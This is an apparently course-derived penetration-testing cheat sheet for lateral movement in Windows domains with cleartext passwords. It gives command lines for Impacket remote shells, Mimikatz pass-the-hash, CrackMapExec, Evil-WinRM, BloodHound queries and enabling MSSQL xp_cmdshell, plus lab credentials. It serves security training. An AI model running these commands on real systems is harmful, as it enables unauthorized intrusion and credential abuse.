# Cleartext password

## CrackMapExec Validating the Credentials with CrackMapExec
```
$ crackmapexec smb <ip_range> -u <user> -p <password> -d <domain>
$ crackmapexec smb <ip_range> -u <user> -p <password> --local-auth
```

## interactive-shell
**Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py]**
One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```
$ psexec.py <domain>/<user>:<password>@<ip>
```

**Mimikatz**
```
> kerberos::hash /password:lucky7

> mimikatz.exe
# privilege::debug 
# sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
```

## pseudo-shell (file write and read)
### Impacket Toolkit
**Atexec.py [https://github.com/fortra/impacket/blob/master/examples/atexec.py]**
```
$ atexec.py <domain>/<user>:<password>@<ip> "command" 
```

**Smbexec.py [https://github.com/fortra/impacket/blob/master/examples/smbexec.py]**
```
$ smbexec.py <domain>/<user>:<password>@<ip>
```

**Wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py]**
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
```
$ wmiexec.py <domain>/<user>:<password>@<ip>
```

**Dcomexec.py [https://github.com/fortra/impacket/blob/master/examples/dcomexec.py]**
```
$ dcomexec.py <domain>/<user>:<password>@<ip>
```

**CrackMapExec**
```
$ crackmapexec smb <ip_range> -u <user> -p < password> -d <domain>
$ crackmapexec smb <ip_range> -u <user> -p < password> -local-auth
```

## WinRM
**Enumerating the Remote Management Users Group**
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

**Using the Cypher Query in BloodHound**
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Establishing WinRM Session from Windows**
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

**Connecting to a Target with Evil-WinRM and Valid Credentials**
```
$ evil-winrm -i <ip> -u <user> -p <password>
```

## RDP
**Enumerating the Remote Desktop Users Group**
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**
If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.

We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP

```
$ xfreerdp/u:<user> /d:<domain> /p:<password>/v:<ip>
```

## SMB
```
$ smbclient.py <domain>/<user>:<password>@<ip>
```

## MSSQL
```
$ crackmapexec mssql <ip_range> -u <user> -p <password>
$ mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>
$ mssqlclient.py <domain>/<user>:<password>@<ip>
```

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

**Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

**Enumerating MSSQL Instances with PowerUpSQL**
```
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Running mssqlclient.py Against the Target
```
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150
```

We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
**Choosing enable_xp_cmdshell**
```
enable_xp_cmdshell
```

```
xp_cmdshell whoami /priv
```
